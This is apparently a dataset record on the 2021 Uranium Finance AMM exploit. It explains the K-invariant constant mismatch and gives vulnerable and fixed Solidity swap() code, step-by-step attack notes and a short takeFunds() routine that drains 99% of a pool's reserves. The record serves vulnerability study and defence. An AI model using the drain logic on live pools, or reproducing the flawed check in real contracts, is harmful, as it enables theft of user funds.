@@ -1,0 +1,34 @@
+{
+ "id": "2021__2021-04-28_Uranium_Finance_KInvariantMismatch",
+ "source_file": "2021/2021-04-28_Uranium_Finance_KInvariantMismatch.md",
+ "title": "Uranium Finance — K Invariant Constant Mismatch Vulnerability Analysis",
+ "date": "2021-04-28",
+ "protocol": "Uranium Finance",
+ "chain": "BSC",
+ "loss_raw": "~$50,000,000",
+ "loss_usd": 50000000.0,
+ "root_cause": "Bug where the constant used in the K invariant check after `swap()` (1000) differs from the fee calculation constant (10000), causing K to effectively increase by 100x",
+ "attack_tx": "Address unidentified",
+ "vulnerable_contract": "Uranium AMM Pair (WBNB/BUSD, etc.)",
+ "classes": [
+  "slippage-amm"
+ ],
+ "code_before": [
+  "// ❌ Uranium Pair Contract\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {\n    // Fee calculation: uses 10000 (Uranium modification)\n    uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));\n    uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));\n\n    // K invariant check: uses 1000 (unchanged from Uniswap original)\n    // balance0Adjusted * balance1Adjusted >= reserve0 * reserve1 * (1000**2)\n    // Should be (10000**2) = 100,000,000, but\n    // checks against (1000**2) = 1,000,000 → passes at a K threshold 100x too low\n    require(\n        balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2),\n        'Uranium: K'\n    );\n}",
+  "// this low-level function should be called from a contract which performs important safety checks\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n    require(amount0Out > 0 || amount1Out > 0, 'UraniumSwap: INSUFFICIENT_OUTPUT_AMOUNT');\n    (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n    require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UraniumSwap: INSUFFICIENT_LIQUIDITY');\n\n    uint balance0;\n    uint balance1;\n    { // scope for _token{0,1}, avoids stack too deep errors\n    address _token0 = token0;\n    address _token1 = token1;\n    require(to != _token0 && to != _token1, 'UraniumSwap: INVALID_TO');\n    if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n    if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n    if (data.length > 0) IUraniumCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n    balance0 = IERC20(_token0).balanceOf(address(this));\n    balance1 = IERC20(_token1).balanceOf(address(this));\n    }\n    uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n    uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n    require(amount0In > 0 || amount1In > 0, 'UraniumSwap: INSUFFICIENT_INPUT_AMOUNT');\n    { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n    uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16)); // fee denom = 10000\n    uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16)); // fee denom = 10000\n    require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UraniumSwap: K'); // ❌ BUG: 1000**2, should be 10000**2\n    }\n\n    _update(balance0, balance1, _reserve0, _reserve1);\n    emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n}"
+ ],
+ "code_after": [
+  "// ✅ Fee calculation constant and K invariant constant aligned\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {\n    uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));\n    uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));\n\n    // Correctly validates against 10000**2 = 100,000,000\n    require(\n        balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2),\n        'Uranium: K'\n    );\n}",
+  "// ✅ Fix: align K invariant constant with fee denominator\nrequire(\n    balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2),\n    'UraniumSwap: K'\n);"
+ ],
+ "steps": [
+  "Step 1: Transfer a small amount of tokens to Uranium",
+  "Step 2: pair.swap(amount0Out≈99%, 0, attacker, \"\")",
+  "Actual K is 100x higher → always passes",
+  "Step 3: Drain most of WBNB + BUSD from the pool"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────┐\n│ Step 1: Transfer a small amount of tokens to Uranium    │\n│         Pair                                            │\n│ WBNB.transfer(pair, 1 wei)                              │\n└─────────────────────┬───────────────────────────────────┘\n                      │\n┌─────────────────────▼───────────────────────────────────┐\n│ Step 2: pair.swap(amount0Out≈99%, 0, attacker, \"\")      │\n│ amount0Out = reserve0 * 99 / 100                        │\n│ K check: (balance0_adj * balance1_adj) >= K * 1000^2   │\n│ Actual K is 100x higher → always passes                 │\n└─────────────────────┬───────────────────────────────────┘\n                      │\n┌─────────────────────▼───────────────────────────────────┐\n│ Step 3: Drain most of WBNB + BU",
+  "// takeFunds() core logic — exploiting the K invariant bug\nfunction takeFunds(address pair, address token0, address token1) internal {\n    uint reserve0;\n    uint reserve1;\n    (reserve0, reserve1,) = IUniswapV2Pair(pair).getReserves();\n\n    // Transfer a small amount of tokens to the pool (to satisfy K)\n    IERC20(token0).transfer(pair, 1);\n\n    // Request 99% of reserves as amountOut\n    // K = (reserve0*10000 - 1*16) * (reserve1*10000)\n    //   >= reserve0 * reserve1 * 1000^2  ← passes with 100x headroom\n    IUniswapV2Pair(pair).swap(\n        reserve0 * 99 / 100,  // drain 99%\n        0,\n        address(this),\n        \"\"\n    );\n}"
+ ]
+}
